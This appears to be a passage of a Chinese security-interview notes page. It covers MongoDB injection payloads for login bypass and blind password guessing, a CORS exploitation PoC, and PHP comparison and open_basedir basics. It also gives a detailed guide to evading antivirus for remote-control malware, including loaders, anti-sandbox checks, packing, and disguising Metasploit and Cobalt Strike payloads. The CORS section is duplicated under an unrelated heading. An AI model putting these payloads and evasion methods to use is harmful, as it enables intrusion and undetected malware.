<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="property">collection</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: &#123;<span class="string">&quot;$ne&quot;</span>: <span class="literal">null</span>&#125;,</span><br><span class="line">    <span class="attr">password</span>: &#123;<span class="string">&quot;$ne&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这个查询的含义是“查找 <code>username</code> 和 <code>password</code> 都不为空的任何文档”。这就可以<strong>绕过密码验证</strong>，成功以第一个匹配的用户身份登录</p>
<p><strong>常见的 MongoDB 注入方式</strong></p>
<p><strong>1. 逻辑操作符注入</strong></p>
<p>这是最常见、最基础的注入方式。攻击者利用 MongoDB 的<strong>逻辑操作符</strong>，如<code>$ne</code>（不等于）、<code>$gt</code>（大于）、<code>$lt</code>（小于）等来改变查询的逻辑</p>
<p><strong>认证绕过</strong></p>
<p>利用 <code>$ne</code> 操作符，可以构造登录认证绕过</p>
<ul>
<li><strong>用户名</strong>：<code>&#39;&#123;&quot;$ne&quot;: null&#125;&#39;</code></li>
<li><strong>密码</strong>：<code>&#39;&#123;&quot;$ne&quot;: null&#125;&#39;</code></li>
</ul>
<p>在某些情况下，也可以使用<strong>布尔类型</strong>来绕过：</p>
<ul>
<li><strong>用户名</strong>：&#96;’admin’</li>
<li><strong>密码</strong>：<code>&#39;&#123;&quot;$gt&quot;: &quot;&quot;&#125;&#39;</code> (即密码大于空字符串的任何值)</li>
</ul>
<p>这种方法简单且有效，因为它利用了数据库自身的查询特性</p>
<p><strong>2. 数组操作符注入</strong></p>
<p>MongoDB 的 <strong><code>$in</code> 操作符</strong>可以用来查询某个字段是否在给定的数组中。攻击者可以利用这个特性进行注入</p>
<p>例如，一个查询可能用来检查用户的角色：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="property">users</span>.<span class="title function_">findOne</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: request.<span class="property">body</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">role</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>攻击者可以尝试在 <code>username</code> 字段输入一个数组，来绕过这个检查：</p>
<ul>
<li><strong>用户名</strong>：<code>&#39;&#123;&quot;$in&quot;: [&quot;admin&quot;, &quot;guest&quot;]&#125;&#39;</code></li>
<li><strong>密码</strong>：<code>&#39;password&#39;</code></li>
</ul>
<p>如果应用程序没有正确处理，这个查询可能被解析为： <code>db.users.findOne(&#123; username: &#123; &quot;$in&quot;: [&quot;admin&quot;, &quot;guest&quot;] &#125;, role: &quot;admin&quot; &#125;);</code></p>
<p>这可以用来<strong>枚举</strong>用户或<strong>绕过</strong>某些基于角色的访问控制</p>
<p><strong>3. 正则表达式注入</strong></p>
<p>MongoDB 支持<strong>正则表达式查询</strong>，这使得攻击者可以利用它来进行更复杂的攻击，比如<strong>盲注</strong></p>
<p>假设存在一个查询，用来查找匹配用户名的文档：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="property">users</span>.<span class="title function_">find</span>(&#123; <span class="attr">username</span>: request.<span class="property">body</span>.<span class="property">username</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>攻击者可以构造一个正则表达式，通过<strong>布尔盲注</strong>的方式来猜测数据</p>
<ul>
<li><strong><code>$regex</code></strong>：用于匹配正则表达式</li>
<li><strong><code>$where</code></strong>：这个操作符允许在查询中使用 JavaScript 代码，是<strong>最高危</strong>的注入点之一</li>
</ul>
<p><strong>盲注步骤</strong>：</p>
<ol>
<li><strong>测试是否存在注入点</strong>：<ul>
<li>输入<code>&#123;&quot;$where&quot;: &quot;this.username == &#39;admin&#39;&quot;&#125;</code>，如果返回管理员信息，则说明存在注入</li>
</ul>
</li>
<li><strong>布尔盲注猜解数据</strong>：<ul>
<li>构造一个查询来猜解管理员的密码长度<ul>
<li><code>&#123;&quot;$where&quot;: &quot;this.username == &#39;admin&#39; &amp;&amp; this.password.length &gt; 5&quot;&#125;</code></li>
</ul>
</li>
<li>如果响应正常（例如返回管理员信息），则说明密码长度大于 5</li>
<li>否则，说明小于等于 5</li>
</ul>
</li>
<li><strong>逐位猜解密码</strong>：<ul>
<li>构造一个正则表达式来猜解密码的每一个字符<ul>
<li><code>&#123;&quot;$where&quot;: &quot;this.username == &#39;admin&#39; &amp;&amp; this.password.match(/^a/)&quot;&#125;</code></li>
</ul>
</li>
<li>这个查询会检查管理员密码是否以 <code>a</code> 开头</li>
<li>通过<strong>二分法</strong>或<strong>逐位</strong>猜测，攻击者可以逐步猜解出完整的密码</li>
</ul>
</li>
</ol>
<p><strong>4. <code>eval</code>注入</strong></p>
<p>在早期版本中，MongoDB 的 <code>db.eval()</code> 命令允许在服务器端执行 JavaScript 代码。这在功能上非常强大，但同时也是一个巨大的安全隐患，因为攻击者可以直接执行任意代码，包括<strong>操作系统命令</strong></p>
<h1 id="19-CORS-系列"><a href="#19-CORS-系列" class="headerlink" title="19- CORS 系列"></a>19- CORS 系列</h1><h3 id="CORS-利用方式"><a href="#CORS-利用方式" class="headerlink" title="CORS 利用方式"></a>CORS 利用方式</h3><p><strong>1. 简单 CORS 配置不当</strong></p>
<p>这是最常见、最基本的 CORS 漏洞，通常由于管理员或开发者为了方便，而设置了过于宽松的白名单</p>
<p><strong>a. <code>Access-Control-Allow-Origin: \*</code></strong></p>
<p>这是最糟糕的配置。<code>*</code> 意味着服务器允许任何来源的域名进行跨域请求。攻击者可以利用这个漏洞，在自己的恶意网站上，发送带有受害者身份信息的请求到目标网站</p>
<ul>
<li><p><strong>利用方式：</strong></p>
<ul>
<li>攻击者在自己的恶意网站 <code>evil.com</code> 上，构造一个 JavaScript 请求</li>
<li>该请求的目标是 <code>target.com</code>，并且带上了受害者的 <code>cookie</code></li>
<li>由于 <code>target.com</code> 允许所有来源，浏览器会发送请求，攻击者就可以获取到受害者的敏感信息，例如个人资料、账户余额等</li>
</ul>
</li>
<li><p><strong>PoC (Proof of Concept) 代码：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>; <span class="comment">// 携带 cookie</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;https://target.com/api/user-info&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>); <span class="comment">// 获取受害者数据</span></span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>b. <code>Access-Control-Allow-Origin</code> 的动态配置</strong></p>
<p>有些网站会根据请求头的 <code>Origin</code> 字段，动态地将其回显到响应头中</p>
<ul>
<li><strong>原理：</strong><ul>
<li>攻击者发送一个请求，其 <code>Origin</code> 头部被设置为 <code>https://evil.com</code></li>
<li>如果服务器响应头中包含 <code>Access-Control-Allow-Origin: https://evil.com</code>，则说明存在漏洞</li>
</ul>
</li>
<li><strong>利用方式：</strong><ul>
<li>与 <code>*</code> 的情况类似，攻击者在 <code>evil.com</code> 上发起请求</li>
<li>浏览器发送的请求头中包含 <code>Origin: https://evil.com</code></li>
<li>服务器将 <code>Origin</code> 的值原样返回，浏览器认为这是一个合法的跨域请求，从而执行</li>
</ul>
</li>
<li><strong>PoC 代码：</strong><ul>
<li>使用 Burp Suite 等工具，修改请求头的 <code>Origin</code> 字段，查看服务器的响应。</li>
</ul>
</li>
</ul>
<p><strong>2. 高级 CORS 漏洞利用</strong></p>
<p>除了基本的配置错误，还有一些更复杂的场景，利用了协议或 URL 解析的差异</p>
<p><strong>a. 协议绕过</strong></p>
<p>某些网站可能只对 <code>http</code> 或 <code>https</code> 协议的 <code>Origin</code> 做了严格限制，而忽略了其他协议</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li>攻击者可以尝试将 <code>Origin</code> 设置为非标准的协议，例如 <code>http://</code> 变为 <code>http</code>、<code>https://</code> 变为 <code>https</code>、或者尝试 <code>file://</code> 等</li>
<li>如果服务器的正则匹配不严谨，就可能被绕过</li>
</ul>
</li>
</ul>
<p><strong>b. 子域名或路径绕过</strong></p>
<p>一些网站的白名单只允许特定的子域名，但正则匹配存在缺陷</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li>假设白名单只允许 <code>https://*.target.com</code>，攻击者可以尝试构造 <code>https://evil.com.target.com</code> 或 <code>https://target.com.evil.com</code></li>
<li>如果正则匹配不严谨，这些域名也可能被认为是合法的</li>
</ul>
</li>
</ul>
<p><strong>c. 端口绕过</strong></p>
<p>CORS 规范中，端口也是同源策略的一部分。但有些服务器在白名单中忽略了端口号</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li>如果 <code>target.com</code> 允许 <code>Origin: https://target.com</code>，攻击者可以尝试使用 <code>https://target.com:8080</code> 作为 <code>Origin</code></li>
<li>如果服务器的白名单没有严格检查端口，这个请求可能会被通过</li>
</ul>
</li>
</ul>
<h1 id="20-远控免杀系列"><a href="#20-远控免杀系列" class="headerlink" title="20- 远控免杀系列"></a>20- 远控免杀系列</h1><h3 id="CORS-利用方式-1"><a href="#CORS-利用方式-1" class="headerlink" title="CORS 利用方式"></a>CORS 利用方式</h3><p><strong>1. 简单 CORS 配置不当</strong></p>
<p>这是最常见、最基本的 CORS 漏洞，通常由于管理员或开发者为了方便，而设置了过于宽松的白名单</p>
<p><strong>a. <code>Access-Control-Allow-Origin: \*</code></strong></p>
<p>这是最糟糕的配置。<code>*</code> 意味着服务器允许任何来源的域名进行跨域请求。攻击者可以利用这个漏洞，在自己的恶意网站上，发送带有受害者身份信息的请求到目标网站</p>
<ul>
<li><p><strong>利用方式：</strong></p>
<ul>
<li>攻击者在自己的恶意网站 <code>evil.com</code> 上，构造一个 JavaScript 请求</li>
<li>该请求的目标是 <code>target.com</code>，并且带上了受害者的 <code>cookie</code></li>
<li>由于 <code>target.com</code> 允许所有来源，浏览器会发送请求，攻击者就可以获取到受害者的敏感信息，例如个人资料、账户余额等</li>
</ul>
</li>
<li><p><strong>PoC (Proof of Concept) 代码：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>; <span class="comment">// 携带 cookie</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;https://target.com/api/user-info&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>); <span class="comment">// 获取受害者数据</span></span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>b. <code>Access-Control-Allow-Origin</code> 的动态配置</strong></p>
<p>有些网站会根据请求头的 <code>Origin</code> 字段，动态地将其回显到响应头中</p>
<ul>
<li><strong>原理：</strong><ul>
<li>攻击者发送一个请求，其 <code>Origin</code> 头部被设置为 <code>https://evil.com</code></li>
<li>如果服务器响应头中包含 <code>Access-Control-Allow-Origin: https://evil.com</code>，则说明存在漏洞</li>
</ul>
</li>
<li><strong>利用方式：</strong><ul>
<li>与 <code>*</code> 的情况类似，攻击者在 <code>evil.com</code> 上发起请求</li>
<li>浏览器发送的请求头中包含 <code>Origin: https://evil.com</code></li>
<li>服务器将 <code>Origin</code> 的值原样返回，浏览器认为这是一个合法的跨域请求，从而执行</li>
</ul>
</li>
<li><strong>PoC 代码：</strong><ul>
<li>使用 Burp Suite 等工具，修改请求头的 <code>Origin</code> 字段，查看服务器的响应。</li>
</ul>
</li>
</ul>
<p><strong>2. 高级 CORS 漏洞利用</strong></p>
<p>除了基本的配置错误，还有一些更复杂的场景，利用了协议或 URL 解析的差异</p>
<p><strong>a. 协议绕过</strong></p>
<p>某些网站可能只对 <code>http</code> 或 <code>https</code> 协议的 <code>Origin</code> 做了严格限制，而忽略了其他协议</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li>攻击者可以尝试将 <code>Origin</code> 设置为非标准的协议，例如 <code>http://</code> 变为 <code>http</code>、<code>https://</code> 变为 <code>https</code>、或者尝试 <code>file://</code> 等</li>
<li>如果服务器的正则匹配不严谨，就可能被绕过</li>
</ul>
</li>
</ul>
<p><strong>b. 子域名或路径绕过</strong></p>
<p>一些网站的白名单只允许特定的子域名，但正则匹配存在缺陷</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li>假设白名单只允许 <code>https://*.target.com</code>，攻击者可以尝试构造 <code>https://evil.com.target.com</code> 或 <code>https://target.com.evil.com</code></li>
<li>如果正则匹配不严谨，这些域名也可能被认为是合法的</li>
</ul>
</li>
</ul>
<p><strong>c. 端口绕过</strong></p>
<p>CORS 规范中，端口也是同源策略的一部分。但有些服务器在白名单中忽略了端口号</p>
<ul>
<li><p><strong>利用方式：</strong></p>
<ul>
<li>如果 <code>target.com</code> 允许 <code>Origin: https://target.com</code>，攻击者可以尝试使用 <code>https://target.com:8080</code> 作为 <code>Origin</code></li>
<li>如果服务器的白名单没有严格检查端口，这个请求可能会被通过</li>
</ul>
<hr>
</li>
</ul>
<h3 id="如何去过国内的杀软"><a href="#如何去过国内的杀软" class="headerlink" title="如何去过国内的杀软"></a>如何去过国内的杀软</h3><p><strong>1. 静态特征码检测</strong></p>
<p>静态检测是指杀软在不运行程序的情况下，通过扫描文件本身的特征来判断是否为恶意软件。这包括特定的代码片段、哈希值、字符串等</p>
<p><strong>应对方案：</strong></p>
<ul>
<li><strong>混淆代码</strong>：使用混淆器（Obfuscator）或手动对代码进行重构。这包括：<ul>
<li><strong>花指令（Junk Instructions）</strong>：在核心代码中插入大量无用的指令（如 <code>NOP</code>），改变代码结构，使得杀软无法匹配其已知的恶意代码特征码</li>
<li><strong>控制流平坦化（Control Flow Flattening）</strong>：将程序的正常执行流程打乱，通过一个大的 <code>switch</code> 或 <code>if/else</code> 结构来控制跳转，让杀软的分析引擎难以理解其逻辑</li>
<li><strong>字符串加密</strong>：将代码中使用的敏感字符串（如 URL、文件名、注册表键）进行加密，只在运行时解密使用。这可以有效绕过基于字符串的特征码检测</li>
</ul>
</li>
<li><strong>改变编译参数</strong>：使用不同的编译器、编译选项，或更改代码，使得生成的机器码与杀软数据库中的特征码不匹配</li>
</ul>
<p><strong>2. 动态行为监控</strong></p>
<p>动态检测是在程序运行时，监控其行为是否具有恶意倾向。国内杀软的启发式引擎（Heuristic Engine）非常强大，能检测到如进程注入、文件加密、网络通信等行为</p>
<p><strong>应对方案：</strong></p>
<ul>
<li><strong>延迟执行</strong>：程序启动后不立即执行恶意行为，而是等待一段较长时间（例如几分钟或几小时），或等待特定的用户操作（如鼠标移动、键盘输入）后，再执行恶意代码。这能有效绕过沙箱环境的短时分析</li>
<li><strong>反沙箱&#x2F;反虚拟机</strong>：通过代码检测自己是否运行在沙箱或虚拟机中。如果发现是，就停止恶意行为或直接退出。常用的检测手段包括：<ul>
<li>检查 CPU 特征（<code>cpuid</code> 指令）</li>
<li>检测特定虚拟机文件或注册表键</li>
<li>测量指令执行时间差异</li>
</ul>
</li>
<li><strong>模块化和分阶段加载</strong>：将恶意功能拆分成多个模块。程序本身可能只是一个无害的加载器，它在运行时从远程服务器下载或解密其他恶意模块。这使得杀软难以在初始阶段就判断其恶意性</li>
</ul>
<p><strong>3. 云查杀与文件信誉库</strong></p>
<p>国内杀软普遍使用云查杀技术，将可疑文件上传到云端进行分析，并维护一个庞大的恶意文件哈希值数据库</p>
<p><strong>应对方案：</strong></p>
<ul>
<li><strong>文件加密和加壳</strong>：使用自定义的加密算法对可执行文件进行加密，并用一个小的解密器（Loader）来启动它。这会改变文件的哈希值，绕过哈希值比对。这种技术就是<strong>加壳（Packing）</strong></li>
<li><strong>代码签名</strong>：使用合法的代码签名证书对恶意软件进行签名。虽然这不能保证免杀，但可能会提高杀软的信任度，使得一些低级别的检测失效。当然，使用窃取的或不合法的证书是有风险的</li>
<li><strong>文件指纹变化</strong>：每次生成样本时都进行微小的改动，比如添加不同的编译时间戳、修改常量值等，以确保每个样本的哈希值都是唯一的</li>
</ul>
<p><strong>4. 驱动级与内核级对抗</strong></p>
<p>高级的杀软会使用内核驱动来监控系统活动，恶意软件也需要通过内核级别的技术进行对抗</p>
<p><strong>应对方案：</strong></p>
<ul>
<li><strong>Rootkit 技术</strong>：利用 Rootkit 技术在内核级别隐藏自己的进程、文件和网络连接，使得杀软难以发现</li>
<li><strong>挂钩（Hooking）</strong>：挂钩杀软驱动的 API，拦截其对恶意行为的监控。当然，这需要非常深厚的内核编程知识</li>
</ul>
<hr>
<h3 id="分离免杀和单体免杀有啥区别，为什么要分离"><a href="#分离免杀和单体免杀有啥区别，为什么要分离" class="headerlink" title="分离免杀和单体免杀有啥区别，为什么要分离"></a>分离免杀和单体免杀有啥区别，为什么要分离</h3><p><strong>什么是分离免杀和单体免杀？</strong></p>
<p>首先，让我们来定义这两个概念：</p>
<ul>
<li><strong>单体免杀（All-in-One Evasion）</strong>：指的是将所有恶意功能（如键盘记录、远程控制、文件加密等）和免杀代码<strong>打包在一个可执行文件</strong>中。这个文件一旦运行，就会在内存中完成所有恶意行为，而不需要外部依赖</li>
<li><strong>分离免杀（Separated Evasion）</strong>：也叫“分阶段免杀”或“多阶段免杀”。它将恶意软件的核心功能与启动器（或称加载器、Loader）<strong>分离开来</strong>。启动器本身是一个非常小的、看起来无害的可执行文件，其唯一任务是在运行时从远程服务器下载或从加密资源中解密并加载真正的恶意负载（Payload），然后执行它</li>
</ul>
<p><strong>为什么要分离？</strong></p>
<p>分离免杀之所以成为主流，是因为它能更有效地对抗现代杀毒软件，特别是云查杀和静态分析技术</p>
<p><strong>1. 绕过静态特征码检测</strong></p>
<p>这是分离免杀最重要的原因。杀毒软件的静态引擎会扫描文件中的恶意代码特征码</p>
<ul>
<li>对于<strong>单体免杀</strong>，所有恶意代码都集中在一个文件中。尽管可以使用混淆技术，但如果杀毒软件的特征库更新得足够快，或者其分析引擎足够强大，很容易在不执行文件的情况下就识别出其中的恶意代码</li>
<li>对于<strong>分离免杀</strong>，启动器本身是<strong>干净的</strong>。它不包含任何恶意代码，只是一段用于下载和解密的“无害”代码。因此，当用户下载或运行时，杀毒软件的静态引擎很难将其识别为恶意文件。真正的恶意负载在运行时才会被下载或解密到内存中，而此时静态引擎已经无法对它进行扫描</li>
</ul>
<p><strong>2. 规避云查杀和哈希比对</strong></p>
<p>现代杀毒软件的云查杀系统会收集可疑文件的哈希值</p>
<ul>
<li>如果一个<strong>单体免杀</strong>样本被捕获，它的哈希值会立即被添加到云端黑名单。即使你对它做了微小的修改，如果杀软使用了模糊哈希，也可能被识别</li>
<li>如果使用<strong>分离免杀</strong>，你可以对启动器进行频繁的微小改动（例如修改时间戳、添加无意义的字节），这会生成<strong>唯一的哈希值</strong>。即使一个启动器被识别，它也不会影响你接下来生成的其他启动器。真正的恶意负载可以保持不变，因为它是动态加载的，不会直接暴露在文件中</li>
</ul>
<p><strong>3. 增加逆向分析的难度</strong></p>
<p>分离免杀为逆向工程增加了额外的门槛</p>
<ul>
<li>逆向工程师拿到的是一个启动器，如果想要分析完整的恶意功能，他必须首先<strong>脱壳</strong>（如果有加密）并<strong>捕获</strong>运行时下载的恶意负载</li>
<li>启动器可能会使用反调试、反虚拟机等技术来阻止分析人员在受控环境中运行它，这进一步增加了分析的难度</li>
</ul>
<hr>
<h3 id="做过其他免杀吗，比如结合-CS-和-MSF-的"><a href="#做过其他免杀吗，比如结合-CS-和-MSF-的" class="headerlink" title="做过其他免杀吗，比如结合 CS 和 MSF 的"></a>做过其他免杀吗，比如结合 CS 和 MSF 的</h3><p><strong>MSFvenom 生成的 Payload 如何免杀？</strong></p>
<p><code>msfvenom</code> 是一个强大的命令行工具，用于生成各种 Payload。它自带了多种编码器（Encoder），可以对 Payload 进行编码来绕过简单的静态特征码检测</p>
<ul>
<li><strong>编码器（Encoders）</strong>：最简单的免杀方法是使用 <code>msfvenom</code> 自带的编码器，例如 <code>shikata_ga_nai</code>。这个编码器会对 Shellcode 进行多态编码，使得每次生成的 Payload 都不一样。但是，这种方法对于现代杀软来说已经不够了，因为杀软可以识别出编码器本身的行为模式</li>
<li><strong>利用模板文件（Templates）</strong>：你可以使用 <code>-x</code> 参数指定一个合法的可执行文件（例如 <code>notepad.exe</code>）作为模板，<code>msfvenom</code> 会将 Payload 注入到这个文件中。这样可以改变文件哈希，并且文件看起来像一个正常的程序</li>
<li><strong>自定义 Shellcode 和加载器（Loader）</strong>：<ul>
<li><strong>生成纯 Shellcode</strong>：使用 <code>-f raw</code> 或 <code>-f bin</code> 参数生成原始的 Shellcode 二进制文件，不带任何可执行文件头</li>
<li><strong>编写自定义加载器</strong>：用 C++、C# 或 PowerShell 等语言编写一个加载器，它的任务是将 Shellcode 加载到内存并执行</li>
<li><strong>混淆加载器代码</strong>：对加载器的代码进行混淆，比如使用花指令、字符串加密，以及反沙箱技术，来绕过杀软对加载器的静态检测</li>
<li><strong>内存执行</strong>：加载器可以使用一些技巧，如 <code>VirtualAlloc</code>、<code>WriteProcessMemory</code> 和 <code>CreateThread</code> 等 API，来分配内存、将 Shellcode 写入，并在新线程中执行。由于 Shellcode 只是数据，不直接在文件中，静态杀软很难发现它</li>
</ul>
</li>
</ul>
<p><strong>Cobalt Strike 生成的 Payload 如何免杀？</strong></p>
<p>Cobalt Strike 生成的 Beacon Payload 同样非常强大，但它的默认 Payload 也会被杀软识别。CS 的免杀需要更高级的技巧</p>
<ul>
<li><strong>分离 Payload 和 Stager</strong>：CS 的 Beacon Payload 通常分为两个阶段：一个小的 <code>Stager</code> 和一个大的 <code>Stageless</code> Payload。<code>Stager</code> 的任务是下载 <code>Stageless</code> Payload。你可以只生成 <code>Stager</code>，并对其进行混淆，而将 <code>Stageless</code> Payload 托管在自己的服务器上</li>
<li><strong>使用自定义的 Shellcode 加载器（Loader）</strong>：<ul>
<li>CS 可以导出原始的 Shellcode。你可以使用前面提到的方法，用自定义的加载器来加载它</li>
<li>很多攻击者会使用<strong>反射式 DLL 注入</strong>来加载 Payload。他们将 Shellcode 封装成一个 DLL，然后通过进程注入技术将 DLL 加载到另一个无害的进程中，以隐藏其行为</li>
</ul>
</li>
<li><strong>绕过行为检测</strong>：CS 的 Beacon 在网络通信、权限提升等方面有很多特征，可能会被杀软的行为监控引擎捕获为了绕过这些检测：<ul>
<li><strong>混淆网络通信</strong>：使用自定义的通信协议或加密方式，使得流量看起来不像 Beacon 的默认流量</li>
<li><strong>进程注入的规避</strong>：使用更隐蔽的进程注入技术，例如直接在内存中执行，而不是写入磁盘文件</li>
<li><strong>使用合法的证书和签名</strong>：对 Payload 文件进行代码签名，增加其可信度</li>
</ul>
</li>
<li><strong>使用第三方工具</strong>：除了自己编写加载器，还有很多开源或商业的工具专门用于混淆和打包 MSF&#x2F;CS 的 Shellcode，例如 <code>sliver</code> 和 <code>Mythic</code> 等。这些工具通常包含了更高级的免杀技术</li>
</ul>
<h1 id="21-PHP代码审计系列"><a href="#21-PHP代码审计系列" class="headerlink" title="21- PHP代码审计系列"></a>21- PHP代码审计系列</h1><h3 id="和-的区别"><a href="#和-的区别" class="headerlink" title="&#x3D;&#x3D;&#x3D; 和 &#x3D;&#x3D; 的区别"></a>&#x3D;&#x3D;&#x3D; 和 &#x3D;&#x3D; 的区别</h3><p><strong><code>==</code> (相等运算符)</strong></p>
<p><code>==</code> 运算符只比较<strong>值</strong>是否相等。如果两个变量的值相同，即使它们的数据类型不同，<code>==</code> 也会返回 <code>true</code>。在比较之前，PHP 会尝试将一个变量的类型转换成另一个变量的类型，以便进行比较。这种行为被称为**“类型转换”<strong>或</strong>“弱类型比较”**</p>
<p><strong>示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串 &#x27;10&#x27; 和整数 10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;10&#x27;</span> == <span class="number">10</span>); <span class="comment">// true，因为 &#x27;10&#x27; 会被转换为整数 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串 &#x27;Hello&#x27; 和整数 0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;Hello&#x27;</span> == <span class="number">0</span>); <span class="comment">// true，因为 &#x27;Hello&#x27; 在数字比较时被转换为 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串 &#x27;10abc&#x27; 和整数 10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;10abc&#x27;</span> == <span class="number">10</span>); <span class="comment">// true，因为 &#x27;10abc&#x27; 的起始数字部分被转换为 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// null 和 false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">null</span> == <span class="literal">false</span>); <span class="comment">// true，因为 null 在布尔比较时被视为 false</span></span><br></pre></td></tr></table></figure>

<p><strong><code>===</code> (全等运算符)</strong></p>
<p><code>===</code> 运算符不仅比较<strong>值</strong>是否相等，还比较<strong>数据类型</strong>是否相同。只有当两个变量的值和数据类型都完全相同时，<code>===</code> 才会返回 <code>true</code>。这种行为被称为**“不进行类型转换的比较”<strong>或</strong>“强类型比较”**</p>
<p><strong>示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串 &#x27;10&#x27; 和整数 10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;10&#x27;</span> === <span class="number">10</span>); <span class="comment">// false，因为一个变量是字符串，另一个是整数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串 &#x27;Hello&#x27; 和整数 0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;Hello&#x27;</span> === <span class="number">0</span>); <span class="comment">// false，因为数据类型不匹配</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串 &#x27;10abc&#x27; 和整数 10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;10abc&#x27;</span> === <span class="number">10</span>); <span class="comment">// false，因为数据类型不匹配</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// null 和 false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">null</span> === <span class="literal">false</span>); <span class="comment">// false，因为 null 和 false 的数据类型不同</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>运算符</th>
<th>比较内容</th>
<th>行为</th>
<th>什么时候用？</th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;&#x3D;</td>
<td>值</td>
<td>弱类型比较（有类型转换）</td>
<td>当你确定不需要关心变量类型，只关心值是否相同时。</td>
</tr>
<tr>
<td>&#x3D;&#x3D;&#x3D;</td>
<td>值和类型</td>
<td>强类型比较（无类型转换）</td>
<td>大多数情况下，推荐使用 &#x3D;&#x3D;&#x3D;，因为它能防止因隐式类型转换导致的意外行为，使代码更健壮和可预测。</td>
</tr>
</tbody></table>
<hr>
<h3 id="本地文件包含能不能通过-PHP-配置限制文件包含的路径"><a href="#本地文件包含能不能通过-PHP-配置限制文件包含的路径" class="headerlink" title="本地文件包含能不能通过 PHP 配置限制文件包含的路径"></a>本地文件包含能不能通过 PHP 配置限制文件包含的路径</h3><p>当然能，这个关键的配置项就是 <code>open_basedir</code></p>
<p><strong><code>open_basedir</code> 的作用</strong></p>
<p><code>open_basedir</code> 是一个强大的安全配置，它定义了 PHP 脚本可以访问的<strong>根目录</strong>。当一个 PHP 脚本试图使用文件系统函数（如 <code>include</code>、<code>require</code>、<code>fopen</code>、<code>file_get_contents</code> 等）来访问文件时，<code>open_basedir</code> 会检查目标文件路径是否位于它指定的目录或其子目录中</p>
<p>如果目标文件不在指定的目录范围内，PHP 会拒绝该操作并抛出错误</p>
<hr>
